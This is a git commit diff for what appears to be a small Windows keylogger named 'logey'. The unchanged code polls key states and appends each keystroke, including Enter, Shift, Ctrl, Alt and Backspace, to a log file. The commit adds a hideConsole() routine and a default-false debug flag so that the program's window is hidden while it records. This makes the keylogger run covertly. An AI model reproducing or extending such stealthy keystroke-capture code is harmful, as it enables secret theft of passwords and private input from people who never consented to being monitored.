f9b47ff4f01457f18a4bdc9ce97976a9a633416c
exler <kakkmar@gmail.com>
2017-10-04 22:18:31 +0200

    :hankey: Commit wrong files. Oops.

--- logey.cpp
+++ logey.cpp
@@ -1,6 +1,9 @@
 #include "logey.h"
 
 int main() {
+
+	if (!debug) hideConsole();
+
 	while (true) // infinite loop
 	{
 		for (int i = 8; i <= 255; i++) {
@@ -18,45 +21,52 @@ void keys(int key, char *filename) {
 	FILE *OUTPUT_FILE;
 	OUTPUT_FILE = fopen(filename, "a+");
 
-	switch(key) {
-		case VK_RETURN:
-			cout << "{ENTER}" << endl;
-			fprintf(OUTPUT_FILE, "%s", "\n");
-			break;
-		case VK_SHIFT:
-			cout << "{SHIFT}";
-			fprintf(OUTPUT_FILE, "%s", "{SHIFT}");
-			break;
-		case VK_SPACE:
-			cout << " ";
-			fprintf(OUTPUT_FILE, "%s", " ");
-			break;
-		case VK_BACK:
-			cout << "{BACKSPACE}";
-			fprintf(OUTPUT_FILE, "%s", "{BACKSPACE}");
-			break;
-		case VK_CONTROL:
-			cout << "{CONTROL}";
-			fprintf(OUTPUT_FILE, "%s", "{CONTROL}");
-			break;
-		case VK_TAB:
-			cout << "{TAB}";
-			fprintf(OUTPUT_FILE, "%s", "{TAB}");
-			break;
-		case VK_ESCAPE:
-			cout << "{ESCAPE}";
-			fprintf(OUTPUT_FILE, "%s", "{ESCAPE}");
-			break;
-		case VK_MENU:
-			cout << "{ALT}";
-			fprintf(OUTPUT_FILE, "%s", "{ALT}");
-			break;
-		default:
-			char x = static_cast<char>(key);
-			cout << x;
-			fprintf(OUTPUT_FILE, "%s", &key);
-			break;
+	switch (key) {
+	case VK_RETURN:
+		cout << endl;
+		fprintf(OUTPUT_FILE, "%s", "\n");
+		break;
+	case VK_SHIFT:
+		cout << "{SHIFT}";
+		fprintf(OUTPUT_FILE, "%s", "{SHIFT}");
+		break;
+	case VK_SPACE:
+		cout << " ";
+		fprintf(OUTPUT_FILE, "%s", " ");
+		break;
+	case VK_BACK:
+		cout << "{BACKSPACE}";
+		fprintf(OUTPUT_FILE, "%s", "{BACKSPACE}");
+		break;
+	case VK_CONTROL:
+		cout << "{CONTROL}";
+		fprintf(OUTPUT_FILE, "%s", "{CONTROL}");
+		break;
+	case VK_TAB:
+		cout << "{TAB}";
+		fprintf(OUTPUT_FILE, "%s", "{TAB}");
+		break;
+	case VK_ESCAPE:
+		cout << "{ESCAPE}";
+		fprintf(OUTPUT_FILE, "%s", "{ESCAPE}");
+		break;
+	case VK_MENU:
+		cout << "{ALT}";
+		fprintf(OUTPUT_FILE, "%s", "{ALT}");
+		break;
+	default:
+		char x = static_cast<char>(key);
+		cout << x;
+		fprintf(OUTPUT_FILE, "%s", &key);
+		break;
 	}
 
 	fclose(OUTPUT_FILE);
+}
+
+void hideConsole() {
+	HWND hideConsole;
+	AllocConsole();
+	hideConsole = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(hideConsole, 0);
 }
--- logey.h
+++ logey.h
@@ -3,4 +3,12 @@
 
 using namespace std;
 
+/*
+*	Global debug variable
+*	If true, the console will be shown and show live output.
+*/
+bool debug = false;
+
+
 void keys(int key, char *filename);
+void hideConsole();
